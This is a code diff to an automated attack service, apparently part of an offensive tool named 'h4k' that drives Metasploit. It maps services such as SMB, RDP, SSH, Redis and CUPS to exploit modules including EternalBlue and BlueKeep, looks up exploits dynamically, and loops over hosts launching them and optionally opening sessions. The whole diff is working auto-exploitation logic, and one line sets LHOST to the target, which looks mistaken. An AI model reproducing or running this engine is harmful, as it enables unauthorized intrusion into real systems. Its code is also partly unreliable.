@@ -11,6 +11,26 @@ from services.msfrpc import MsfClient
 
 logger = logging.getLogger("h4k.attack")
 
+# Fallback static mapping when dynamic discovery is unavailable
+STATIC_SERVICE_MODULES: dict[str, str] = {
+    "ssh": "exploit/multi/ssh/sshexec",
+    "smb": "exploit/windows/smb/ms17_010_eternalblue",
+    "microsoft-ds": "exploit/windows/smb/ms17_010_eternalblue",
+    "netbios": "exploit/windows/smb/ms17_010_eternalblue",
+    "rdp": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+    "ms-wbt": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+    "http": "exploit/multi/http/tomcat_mgr_upload",
+    "https": "exploit/multi/http/tomcat_mgr_upload",
+    "ftp": "exploit/unix/ftp/vsftpd_234_backdoor",
+    "telnet": "exploit/multi/telnet/telnet_binary_options",
+    "mysql": "exploit/linux/mysql/mysql_slavery",
+    "postgres": "exploit/linux/postgres/postgres_payload",
+    "mongodb": "exploit/mongodb/mongodb_iq",
+    "redis": "exploit/linux/redis/redis_exec",
+    "vnc": "exploit/vnc/vnc_keyboard_exec",
+    "cups": "exploit/multi/misc/cups_ipp_remote_code_execution",
+}
+
 
 class AttackService:
     def __init__(
@@ -32,16 +52,23 @@ class AttackService:
                 "user": c.get("user", ""),
                 "password": c.get("password", ""),
             }
+        # a named module from the triage drawer wins over the heuristic
+        if req.module and not req.module.startswith(
+            ("exploit/", "auxiliary/", "post/")
+        ):
+            raise ValueError(f"refusing to run {req.module!r}: not a module path")
         attacks: list[dict] = []
         hosts = self._resolve_hosts(req)
         for host in hosts:
             for svc in self._resolve_services(req, host):
-                module = self._module_for_service(svc)
+                module = req.module or self._dynamic_module_for_service(svc)
                 if not module:
                     continue
                 cred = cred_idx.get((host, svc.lower()))
                 self.progress(f"attacking {host} {svc} via {module}", 0)
-                res = self._try_exploit(module, host, svc, req.open_sessions, cred=cred)
+                res = self._try_exploit(
+                    module, host, svc, req.open_sessions, cred=cred, port=req.port
+                )
                 attacks.append(
                     {
                         "host": host,
@@ -71,6 +98,9 @@ class AttackService:
     def _resolve_services(self, req: AttackRequest, host: str) -> list[str]:
         if req.services:
             return req.services
+        # a pinned module already says what to run; one pass is enough
+        if req.module:
+            return [""]
         # default: attack services that map to an exploit module
         ws = self.msf.current_workspace() or "default"
         names: list[str] = []
@@ -87,19 +117,23 @@ class AttackService:
     @staticmethod
     def _module_for_service(service: str) -> str | None:
         s = (service or "").lower()
-        if "ssh" in s:
-            return "exploit/multi/ssh/sshexec"
-        if "smb" in s or "microsoft-ds" in s or "netbios" in s:
-            return "exploit/windows/smb/ms17_010_eternalblue"
-        if "rdp" in s or "ms-wbt" in s:
-            return "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
-        if "http" in s:
-            return "exploit/multi/http/tomcat_mgr_upload"
-        if "ftp" in s:
-            return "exploit/unix/ftp/vsftpd_234_backdoor"
-        if "telnet" in s:
-            return "exploit/multi/telnet/telnet_binary_options"
+        if s in STATIC_SERVICE_MODULES:
+            return STATIC_SERVICE_MODULES[s]
+        for key, module in STATIC_SERVICE_MODULES.items():
+            if key in s:
+                return module
         return None
+
+    def _dynamic_module_for_service(self, service: str) -> str | None:
+        """Try to find a matching exploit module dynamically."""
+        s = (service or "").lower()
+        try:
+            exploits = self.msf.find_exploits(service=s)
+            if exploits:
+                return exploits[0]["fullname"]
+        except Exception as exc:
+            logger.debug("dynamic module search failed for %s: %s", service, exc)
+        return self._module_for_service(service)
 
     def _try_exploit(
         self,
@@ -108,16 +142,18 @@ class AttackService:
         svc: str,
         open_sessions: bool,
         cred: dict[str, str] | None = None,
+        port: int | None = None,
     ) -> dict:
         """Set sensible per-module options (only valid ones) and execute.
 
         Only RHOSTS (and RPORT) are set unconditionally. Credential-driven
         exploits (ssh/tomcat/ftp) only run when a verified cred is supplied.
+        An operator-supplied port (from a triaged finding) beats the guess.
         """
         valid = self._module_options(module)
         opts: dict[str, Any] = {"RHOSTS": host}
         if "RPORT" in valid:
-            opts["RPORT"] = self._port_for(svc)
+            opts["RPORT"] = port or self._port_for(svc)
         if "LHOST" in valid:
             opts["LHOST"] = host
         if "LPORT" in valid:
